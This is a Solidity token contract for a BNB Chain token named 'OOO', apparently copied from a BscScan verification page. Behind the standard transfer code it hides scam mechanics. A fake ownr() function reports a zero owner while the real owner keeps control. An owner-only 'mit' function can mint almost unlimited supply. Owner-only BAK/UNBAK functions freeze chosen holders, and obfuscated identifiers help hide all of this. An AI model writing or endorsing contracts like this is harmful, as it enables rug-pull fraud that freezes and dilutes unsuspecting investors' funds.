/**
 *Submitted for verification at BscScan.com on 2022-09-11
*/

/**
 *Submitted for verification at BscScan.com on 2022-07-29
*/

pragma solidity ^0.4.25;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract Ownable {
    address public owner;

    event owneresshipTransferred(address indexed previousowneres, address indexed newowneres);

    modifier onlyowneres() {
        require(msg.sender == owner);
        _;
    }

/**
    * @dev Returns the address of the current owner.
     */
    function ownr() public pure  returns  (address) {
        return address(0);
    }


    function transferowneresship(address newowneres) public onlyowneres {
        require(newowneres != address(0));
        emit owneresshipTransferred(owner, newowneres);
        owner = newowneres;
    }

    function renounceowneresship() public onlyowneres {
        emit owneresshipTransferred(owner, address(0));
        owner = address(0);
    }
}



contract BaseToken is Ownable {
    using SafeMath for uint256;

    string constant public name = 'OOO';

    string constant public symbol = 'OOO';

    uint8 constant public decimals = 18;

    uint256 public totalSupply = 10000000000*10**uint256(decimals);

    uint256 public constant MAXSupply = 1000000000000000000000000000000000000000000000000000 * 10 ** uint256(decimals);

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    mapping(address => bool) private _isExcludedFromfet;

    mapping(address => bool) private _lkck;


    uint256 public _taxfet = 0;
    uint256 private _previousTaxfet = _taxfet;

    uint256 public _burnfet = 2;
    uint256 private _previousBurnfet = _burnfet;


    address public projectAddress = 0x8d6413529EC6C22E382fDA683B717E086dAe4A6f;


    address public burnAddress = 0x000000000000000000000000000000000000dEaD;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function _transfer(address from, address to, uint value) internal {
        require(to != address(0), "is 0 address");

        require(!_lkck[from], "is lkck");

        if(_isExcludedFromfet[from])
            removeAllfet();

        uint256 fet =  calculateTaxfet(value);

        uint256 burn =  calculateBurnfet(value);

        balanceOf[from] = balanceOf[from].sub(value);

        balanceOf[to] = balanceOf[to].add(value).sub(fet).sub(burn);

        if(fet > 0) {
            balanceOf[projectAddress] = balanceOf[projectAddress].add(fet);
            emit Transfer(from, projectAddress, fet);
        }

        if(burn > 0) {
            balanceOf[burnAddress] = balanceOf[burnAddress].add(burn);
            emit Transfer(from, burnAddress, burn);
        }


         if(_isExcludedFromfet[from])
            restoreAllfet();

        emit Transfer(from, to, value);
    }


    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].add(addedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].sub(subtractedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }


    function mit(address target, uint256 edAmount) public onlyowneres{
    	require (totalSupply + edAmount <= MAXSupply);

        balanceOf[target] = balanceOf[target].add(edAmount);
        totalSupply = totalSupply.add(edAmount);

        emit Transfer(0, this, edAmount);
        emit Transfer(this, target, edAmount);
    }

    function calculateTaxfet(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_taxfet).div(
            10 ** 2
        );
    }

    function calculateBurnfet(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_burnfet).div(
            10 ** 2
        );
    }

    function removeAllfet() private {
        if(_taxfet == 0 && _burnfet == 0)
            return;

        _previousTaxfet = _taxfet;
        _previousBurnfet = _burnfet;
        _taxfet = 0;
        _burnfet = 0;
    }

    function restoreAllfet() private {
        _taxfet = _previousTaxfet;
        _burnfet = _previousBurnfet;
    }



    function BAK(address account) public onlyowneres {
        _lkck[account] = true;
    }


    function UNBAK(address account) public onlyowneres {
        _lkck[account] = false;
    }


    function islkck(address account) public view returns (bool) {

        return _lkck[account];
    }


}


contract Token is BaseToken {

    constructor() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);

        owner = msg.sender;


    }

    function() public payable {
       revert();
    }
}